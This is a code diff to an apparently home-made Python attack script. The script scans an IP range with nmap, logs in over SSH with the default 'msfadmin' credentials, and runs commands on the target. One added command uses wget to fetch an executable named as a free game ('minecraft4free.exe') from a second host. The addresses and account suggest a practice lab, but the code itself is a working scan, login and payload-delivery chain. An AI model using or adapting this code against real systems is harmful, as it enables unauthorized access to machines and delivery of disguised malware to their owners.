@@ -35,10 +35,21 @@ def nmaper():
     #once all open ports have been found
         if portscan == 'open':
             yes = "yes"
-        #    subprocess.run(["ssh", "msfadmin@"+ips])\
+    
+def shher():
     command = 'ls'
+    command2 = "wget http://192.168.56.101/minecraft4free.exe"
+    #command3 = ""
+    command = "ls"
     client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect('192.168.56.103', username='msfadmin', password='msfadmin')
+    (stdin, stdout, stderr) = client.exec_command(command)
+    lines = stdout.readlines()
+    print(lines)
+    (stdin, stdout, stderr) = client.exec_command(command2)
+    lines = stdout.readlines()
+    print(lines)
     (stdin, stdout, stderr) = client.exec_command(command)
     lines = stdout.readlines()
     print(lines)
@@ -59,8 +70,8 @@ def ping(ip):
         #print(IpList)
     os.system('del '+ip)
 #print(IpList)
-#startip=list(map(int,sys.argv[sys.argv.index('-s')+1].strip().split('.')))
-#endip=list(map(int,sys.argv[sys.argv.index('-e')+1].strip().split('.')))
+startip=list(map(int,sys.argv[sys.argv.index('-s')+1].strip().split('.')))
+endip=list(map(int,sys.argv[sys.argv.index('-e')+1].strip().split('.')))
 
 #print(IpList)
 def scanner():  
@@ -84,10 +95,9 @@ def scanner():
                     startip[1]+=1
             else:
                 startip[2]+=1
-    nmaper()
 
 
-#nmaper()
+
 def counter():
     x = 0 
     while (x < 100):
